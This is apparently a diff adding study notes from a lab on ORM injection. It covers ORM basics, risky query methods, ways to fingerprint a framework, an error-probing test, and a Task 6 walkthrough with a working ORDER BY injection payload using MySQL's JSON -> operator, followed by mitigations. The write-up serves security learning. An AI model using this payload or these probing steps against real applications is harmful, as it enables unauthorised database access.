@@ -1,0 +1,149 @@
+__________________________________________________________________________________________
+
+
+TASK 2 Understanding ORM
+
+ORM (Object-Relational Mapping) is a technique that connects object-oriented programming languages with relational databases. 
+It allows developers to work with database data as objects, reducing the need for complex SQL queries. 
+ORM simplifies data handling, improves productivity, and ensures consistency in database operations.
+
+ORM acts as a bridge between programming languages and databases. Its main benefits include:
+    - Reducing repetitive code by generating SQL automatically.
+    - Allowing developers to focus on business logic instead of database details.
+    - Ensuring consistent database operations.
+    - Making database schema changes easier to manage.
+
+Popular ORM Frameworks
+- Doctrine (PHP)                : Flexible ORM for PHP, often used with Symfony.
+- Hibernate (Java)              : Robust ORM for Java with features like caching and lazy loading.
+- SQLAlchemy (Python)           : Versatile ORM for Python, combining raw SQL and ORM benefits.
+- Entity Framework (C#)         : Microsoft's ORM for .NET, simplifying data access.
+- Active Record (Ruby on Rails) : Default ORM for Rails, mapping tables to classes and rows to objects.
+
+__________________________________________________________________________________________
+
+
+TASK 3 How ORM Works
+
+This code demonstrates how to retrieve records from the database using ORM methods:
+
+    /*************************************************************************************
+    * use App\Models\User;
+    *
+    * // Retrieve a user by ID
+    * $user = User::find(1);
+    *
+    * // Retrieve all users
+    * //SELECT * FROM users
+    * $allUsers = User::all();
+    *
+    * // Retrieve users by specific criteria
+    * //SELECT * FROM users WHERE email = 'admin@example.com'
+    * $admins = User::where('email', 'admin@example.com')->get();
+    *************************************************************************************/
+
+Key Differences in Exploitation Techniques
+
+    | Aspect               | SQL Injection                                                        | ORM Injection                                                                                     |
+    |----------------------|----------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|
+    | Level of Injection   | Targets raw SQL queries directly                                     | Targets the ORM framework's query construction                                                    |
+    | Complexity           | More straightforward, as it manipulates raw SQL                      | Requires understanding of ORM internals and methods                                               |
+    | Detection            | Easier to detect with traditional WAFs and query logs                | Harder to detect, as payloads are within ORM methods                                              |
+    | Mitigation           | Use of prepared statements, parameterized queries, input validation  | Proper ORM configuration, application-level input validation, ORM features enforcing query safety |
+
+__________________________________________________________________________________________
+
+
+TASK 4 Identifying ORM Injection
+
+Techniques for testing ORM injection
+
+    - Manual review     : look for raw query methods and string concatenation that include user input (e.g., whereRaw()).
+    - Automated scanning: run security scanners that detect dynamic query construction patterns.
+    - Input fuzzing     : inject special characters/keywords into inputs to see if queries change.
+    - Error probing     : send malformed input to elicit detailed errors revealing query structure.
+
+Common frameworks and risky ORM methods
+
+    Framework    | ORM Library    | Common risky methods
+    -------------|----------------|---------------------
+    Laravel      | Eloquent       | whereRaw(), DB::raw()
+    Ruby on Rails| Active Record  | where("name = '#{input}'")
+    Django       | Django ORM     | extra(), raw()
+    Spring       | Hibernate      | createQuery() with concatenation
+    Node.js      | Sequelize      | sequelize.query()
+
+Techniques to identify the framework
+    - Cookies       : session cookie names can reveal frameworks (e.g., "laravel_session").
+    - Source code   : check HTML comments, meta tags, embedded scripts.
+    - HTTP headers  : inspect Server, X-Powered-By, etc.
+    - URL patterns  : routing conventions can be telling.
+    - Pages/errors  : login and error pages may have framework-specific output.
+
+Example (Laravel)
+    - Identified Laravel via cookies.
+    - Test: enter 1' into the Email (Vulnerable) field.
+    - If you get errors like "SQLSTATE[42000]: Syntax error or access violation", the input was concatenated into a query, indicating unsafe handling and typical Eloquent ORM query behavior.
+
+__________________________________________________________________________________________
+
+
+TASK 6 ORM Injection - Vulnerable Implementation
+
+Access the machine at:
+    https://10-80-162-23.reverse-proxy.cell-prod-eu-west-1a.vm.tryhackme.com/query_users?sort=name
+    where sort=name
+
+This endpoint sorts users by the name column:
+    SELECT * FROM users ORDER BY name ASC LIMIT 2
+
+Injection Attempt:
+    Injecting name' causes an error due to invalid column handling.
+    https://10-80-162-23.reverse-proxy.cell-prod-eu-west-1a.vm.tryhackme.com/query_users?sort=name;
+    where sort=name'
+
+Exploitation:
+    To bypass the ORDER BY clause and manipulate the query, use the -> operator (MySQL JSON function) with a crafted payload.
+
+Payload Breakdown:
+    - Initial Query     : SELECT * FROM users ORDER BY name ASC LIMIT 2
+    - Injection         : name->"%27)) breaks the query and allows SQL injection.
+    - Final Payload     : 
+        https://10-80-162-23.reverse-proxy.cell-prod-eu-west-1a.vm.tryhackme.com/query_users?sort=name-%3E%22%27))%20LIMIT%2010%23
+        where sort=name->"')) LIMIT 10#
+    - Resulting Query   :
+        SELECT * FROM users ORDER BY json_unquote(json_extract(name, '$.""')) LIMIT 10#"')) ASC LIMIT 2
+        This fetches 10 rows, bypassing the original limit.
+
+Key Notes:
+    -> triggers JSON extraction.
+    "%27)) closes the string and injects SQL.
+    # comments out the rest of the query.
+
+__________________________________________________________________________________________
+
+
+TASK 7 Best Practices
+
+Input validation: 
+    Validate user inputs on both client and server sides to ensure they meet expected formats and lengths. 
+    Use regular expressions and built-in validation tools.
+
+Parameterised queries: 
+    Use prepared statements to prevent user inputs from being executed as code. 
+    Avoid directly concatenating inputs into SQL queries.
+
+ORM usage: 
+    Leverage ORM tools for database interactions, ensuring proper configuration and secure handling of inputs. 
+    Parameterise any custom SQL queries.
+
+Escaping and sanitisation: 
+    Remove or escape special characters in user inputs to prevent injection attacks.
+
+Allowlist input: 
+    Accept only specific, expected values and reject all others for stronger security.
+
+__________________________________________________________________________________________
+
+
+Appendix:
